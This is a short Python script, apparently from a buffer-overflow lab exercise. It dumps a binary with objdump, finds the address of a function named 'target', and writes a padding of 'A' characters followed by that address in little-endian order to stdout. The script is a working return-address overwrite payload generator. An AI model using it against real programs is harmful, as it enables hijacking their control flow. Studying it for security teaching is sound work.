#!/usr/bin/python3
from subprocess import call, Popen, PIPE
import sys
import os

TMP_FILE = "/tmp/vuln_program.dump"

def create_obj_dump(exec_path):
	dump_file = open(TMP_FILE, "w")
	dump_proc = call(["objdump", "-D", exec_path], stdout=dump_file)
	dump_file.close()

def delete_obj_dump():
	os.remove(TMP_FILE)

def get_target_addr():
	cat_proc = Popen(["cat", TMP_FILE], stdout=PIPE)
	grep_proc = Popen(["grep", "<target>"], stdin=cat_proc.stdout, stdout=PIPE)
	return grep_proc.communicate()[0].decode("utf-8").split(" ")[0]

def fix_target_addr(addr):
	if addr[0:2] == "0x":
		addr = addr[2:]
	elif addr[0:1] == "x":
		addr = addr[1:]
	elif len(addr) % 2 != 0:
		addr = "0" + addr
	return addr

def main():
	create_obj_dump(sys.argv[1])
	hex_input_addr = fix_target_addr(get_target_addr())
	delete_obj_dump()

	a_buffer = "A" * int(sys.argv[2])
	
	

	# Convert to byte pairs and reverse the order
	byte_pairs = ["".join(x) for x in zip(*[iter(hex_input_addr)]*2)][::-1]

	# Craft malicious input
	malicious_input = bytearray(a_buffer, 'utf-8') + bytearray.fromhex("".join(byte_pairs))

	# Output malicious input as raw byte stream 
	sys.stdout.buffer.write(malicious_input)

if __name__ == '__main__':
	main()
